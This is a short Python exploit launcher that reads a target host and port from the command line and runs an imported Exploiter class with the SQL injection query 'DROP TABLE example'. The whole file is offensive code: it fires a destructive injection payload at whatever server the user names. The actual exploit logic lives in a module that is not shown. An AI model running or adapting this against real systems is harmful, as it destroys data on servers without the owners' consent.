import sys
from Sample.Exploiter import Exploiter


def main(HOST: str, PORT: int) -> None: 
    '''
    Configuring and running the exploiter.
    '''
    exploiter = Exploiter(HOST, PORT)               # defining HOST and PORT
    exploiter.set_query('DROP TABLE example')       # defining SQL injection
    
    try: 
        exploiter.run()
    except AssertionError as E:
        print(E)
            
    return
    

if __name__ == '__main__':

    # execution arguments checking
    if len(sys.argv) != 2:
        print("[-] USAGE: python3 exploit.py <target:port>")
        sys.exit()
        
    # retrieving parameters
    HOST = sys.argv[1].split(':')[0]
    PORT = sys.argv[1].split(':')[1]
    main(HOST, PORT)
        
